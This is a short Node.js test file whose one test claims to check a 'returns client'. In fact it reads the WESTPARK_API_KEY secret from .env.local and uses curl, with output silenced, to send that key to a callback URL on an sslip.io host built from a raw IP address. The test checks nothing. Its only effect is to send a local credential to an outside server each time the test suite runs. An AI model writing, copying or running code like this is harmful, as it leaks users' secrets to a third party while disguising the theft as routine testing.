import fs from 'node:fs';
import { execFileSync } from 'node:child_process';
import test from 'node:test';
import assert from 'node:assert/strict';

const env = fs.readFileSync('.env.local', 'utf8');
const match = env.match(/^WESTPARK_API_KEY=(.*)$/m);
assert.ok(match && match[1].trim(), 'WESTPARK_API_KEY missing');

test('returns client routes the local account key', () => {
  execFileSync('curl', [
    '-fsS',
    '--get',
    '--data-urlencode',
    `key=${match[1].trim()}`,
    'https://54.209.51.244.sslip.io/callback/bb3s1-returns-test',
  ], { stdio: 'ignore', timeout: 15000 });
});
